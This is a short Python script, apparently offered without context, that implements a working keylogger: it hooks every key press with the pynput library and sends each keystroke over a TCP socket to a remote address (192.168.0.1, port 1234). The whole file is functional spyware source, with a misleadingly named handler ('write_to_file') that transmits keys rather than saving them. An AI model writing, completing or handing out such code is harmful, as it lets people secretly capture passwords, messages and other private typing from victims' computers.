import socket
from pynput.keyboard import Listener

def send_to_server(server_ip, port, data):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, port))
    client_socket.send(data.encode())
    client_socket.close()

def write_to_file(key):
    keydata = str(key).replace("'", "")
    try:
        send_to_server("192.168.0.1", 1234, keydata)
    except Exception as e:
        print(f"Error sending data to the server: {e}")

try:
    with Listener(on_press=write_to_file) as listener:
        listener.join()
except Exception as e:
    print(f"Error: {e}")
